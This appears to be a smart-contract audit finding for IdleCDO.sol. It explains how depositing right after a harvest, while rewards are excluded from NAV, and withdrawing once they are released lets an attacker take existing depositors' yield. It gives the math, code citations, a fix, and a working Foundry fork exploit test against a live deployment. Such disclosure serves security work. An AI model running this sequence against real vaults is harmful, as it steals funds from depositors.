### Title
Post-harvest deposits capture rewards excluded from tranche pricing - (`contracts/IdleCDO.sol`)

### Summary
`getContractValue()` subtracts rewards that were harvested but are still locked, while deposits mint tranche tokens at the price calculated from that reduced NAV. An attacker can deposit immediately after `harvest()`, wait for `_lockedRewards()` to decay, and withdraw after `_updateAccounting()` realizes the reward gain. With sufficient capital, the attacker captures most of the unlocked rewards without having contributed capital when those rewards accrued.

### Finding Description
`harvest()` redeems and sells rewards, records the proceeds in `harvestedRewards`, resets `latestHarvestBlock`, and calls `_updateAccounting()` while the harvested proceeds remain excluded through `_lockedRewards()`. [1](#0-0) 

`getContractValue()` explicitly subtracts `_lockedRewards()` from the strategy-token and underlying balances. [2](#0-1) 

Immediately after a harvest in block `H`, `_lockedRewards()` is approximately the full `harvestedRewards`, so the NAV used for accounting remains near the pre-harvest value. During the next `releaseBlocksPeriod` blocks, the locked amount decreases linearly and the excluded rewards progressively re-enter NAV. [3](#0-2) 

`_deposit()` first updates accounting using the temporarily reduced NAV, then mints shares using the stored tranche price. [4](#0-3) 

A later withdrawal calls `_updateAccounting()` again after locked rewards have been released into NAV, updates the tranche price, and pays the attacker according to the higher price. [5](#0-4) 

For a tranche with pre-deposit NAV `N_T` and net reward allocation `R_T`, an attacker depositing `D` receives approximately `D / (N_T + D)` of `R_T`. For example, with `D = 10 * N_T`, the attacker captures about 91% of the rewards allocated to that tranche, less applicable fees and rounding.

### Impact Explanation
This is direct theft of yield earned by existing depositors. The attacker buys tranche tokens while a known pool asset is temporarily excluded from NAV, then exits after that asset is recognized. The stolen amount scales with the harvest size and attacker capital; a sufficiently large deposit can capture most of the newly released rewards rather than only the yield attributable to the attacker's deposit.

The same-block deposit/withdrawal protection does not prevent this because the profitable sequence spans multiple blocks: harvest, deposit, wait for reward release, then withdraw. [6](#0-5) 

### Likelihood Explanation
Harvests are predictable protocol operations, and an unprivileged depositor can enter in the next block or even the same block through transaction ordering. No malicious owner, manager, rebalancer, borrower, or strategy behavior is required.

The attack is unavailable when `releaseBlocksPeriod` is effectively zero or when no meaningful reward is harvested. When the period is nonzero, the attacker must hold the tranche position through the release period and is exposed to normal strategy risk during that interval. The expected reward amount must exceed fees, withdrawal costs, and any adverse strategy movement.

### Recommendation
Price deposits using NAV that includes already-harvested rewards, rather than subtracting `_lockedRewards()` from the value used by `_mintSharesAtCurrPrice()`. Alternatively, prevent deposits until the release period ends, or distribute harvested rewards through a snapshot/reward-accounting mechanism restricted to shares outstanding before the harvest.

### Proof of Concept
The following Foundry fork test models the honest harvest and then performs the unprivileged deposit-release-withdraw sequence. `IDLE_CDO` must identify a live `IdleCDO` deployment, `HARVEST_CALLDATA` must be the valid production calldata for the selected fork block, and the fork must have nonzero harvestable rewards.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IERC20Like {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IIdleCDO {
    function owner() external view returns (address);
    function token() external view returns (address);
    function getContractValue() external view returns (uint256);
    function releaseBlocksPeriod() external view returns (uint256);
    function depositAA(uint256 amount) external returns (uint256);
    function withdrawAA(uint256 amount) external returns (uint256);
}

contract PostHarvestRewardSandwichTest is Test {
    IIdleCDO internal cdo;
    IERC20Like internal underlying;
    address internal attacker = address(0xA77AC4);

    function setUp() public {
        vm.createSelectFork(
            vm.envString("MAINNET_RPC_URL"),
            vm.envUint("FORK_BLOCK")
        );
        cdo = IIdleCDO(vm.envAddress("IDLE_CDO"));
        underlying = IERC20Like(cdo.token());
    }

    function testPostHarvestDepositCapturesLockedRewards() public {
        uint256 navBeforeHarvest = cdo.getContractValue();
        require(navBeforeHarvest != 0, "empty vault");
        require(cdo.releaseBlocksPeriod() != 0, "locking disabled");

        // Honest protocol operation. The calldata should be the production
        // harvest calldata valid at FORK_BLOCK.
        bytes memory harvestCalldata = vm.envBytes("HARVEST_CALLDATA");
        vm.prank(cdo.owner());
        (bool harvested,) = address(cdo).call(harvestCalldata);
        require(harvested, "harvest failed");

        // Enter after the harvest while most/all proceeds are excluded
        // from getContractValue() through _lockedRewards().
        vm.roll(block.number + 1);

        uint256 depositAmount = navBeforeHarvest;
        deal(address(underlying), attacker, depositAmount);

        vm.startPrank(attacker);
        underlying.approve(address(cdo), depositAmount);
        uint256 mintedShares = cdo.depositAA(depositAmount);
        vm.stopPrank();

        // Wait until the harvested reward has re-entered NAV.
        vm.roll(block.number + cdo.releaseBlocksPeriod() + 1);

        uint256 underlyingBefore = underlying.balanceOf(attacker);
        vm.prank(attacker);
        cdo.withdrawAA(mintedShares);
        uint256 received = underlying.balanceOf(attacker) - underlyingBefore;

        emit log_named_uint("deposit", depositAmount);
        emit log_named_uint("withdrawn", received);
        emit log_named_int("profit", int256(received) - int256(depositAmount));

        assertGt(received, depositAmount, "no reward capture");
    }
}
```

### Citations

**File:** contracts/IdleCDO.sol (L183-186)
```text
    return (_contractTokenBalance(_strategyToken) * _strategyPrice() / (10**(IERC20Detailed(_strategyToken).decimals()))) +
            _contractTokenBalance(token) -
            _lockedRewards() -
            unclaimedFees;
```

**File:** contracts/IdleCDO.sol (L240-253)
```text
    // set _lastCallerBlock hash
    _updateCallerBlock();
    // check if _strategyPrice decreased
    _checkDefault();
    // interest accrued since last depositXX/withdrawXX/harvest is splitted between AA and BB
    // according to trancheAPRSplitRatio. NAVs of AA and BB are updated and tranche
    // prices adjusted accordingly
    _updateAccounting();
    // get underlyings from sender
    address _token = token;
    uint256 _preBal = _contractTokenBalance(_token);
    _transferUnderlyingsFrom(msg.sender, address(this), _amount);
    // mint tranche tokens according to the current tranche price
    _minted = _mintSharesAtCurrPrice(_contractTokenBalance(_token) - _preBal, msg.sender, _tranche);
```

**File:** contracts/IdleCDO.sol (L480-506)
```text
    // check if _strategyPrice decreased
    _checkDefault();
    // accrue interest to tranches and updates tranche prices
    _updateAccounting();
    // redeem all user balance if 0 is passed as _amount
    if (_amount == 0) {
      _amount = _userTrancheBal(msg.sender, _tranche);
    }
    _checkIs0(_amount == 0);
    address _token = token;
    // get current available unlent balance
    uint256 balanceUnderlying = _contractTokenBalance(_token);
    // Calculate the amount to redeem
    toRedeem = _amount * _tranchePrice(_tranche) / ONE_TRANCHE_TOKEN;
    uint256 _want = toRedeem;
    if (toRedeem > balanceUnderlying) {
      // if the unlent balance is not enough we try to redeem what's missing directly from the strategy
      // and then add it to the current unlent balance
      // NOTE: A difference of up to 100 wei due to rounding is tolerated
      toRedeem = _liquidate(toRedeem - balanceUnderlying, revertIfTooLow) + balanceUnderlying;
    }

    _withdrawOps(_amount, _want, _tranche);

    // send underlying to msg.sender. Keep this at the end of the function to avoid 
    // potential read only reentrancy on cdo variants that have hooks (eg with nfts)
    _transferUnderlyings(msg.sender, toRedeem);
```

**File:** contracts/IdleCDO.sol (L709-712)
```text
    if (_harvestedRewards > 1 && _blocksSinceLastHarvest < _releaseBlocksPeriod) {
      // progressively release harvested rewards
      _locked = _harvestedRewards * (_releaseBlocksPeriod - _blocksSinceLastHarvest) / _releaseBlocksPeriod;
    }
```

**File:** contracts/IdleCDO.sol (L770-783)
```text
      if (!_skipFlags[0]) {
        // Redeem all rewards associated with the strategy
        _res[2] = _strategy.redeemRewards(_extraData[0]);
        // Sell rewards
        (_res[0], _res[1], _totSold) = _sellAllRewards(_strategy, _sellAmounts, _minAmount, _skipReward, _extraData[1]);
      }
      // update last saved harvest block number
      latestHarvestBlock = block.number;
      // update harvested rewards value (avoid setting it to 0 to save some gas)
      harvestedRewards = _totSold == 0 ? 1 : _totSold;

      // split converted rewards if any and update tranche prices
      // NOTE: harvested rewards won't be counted directly but released over time
      _updateAccounting();
```
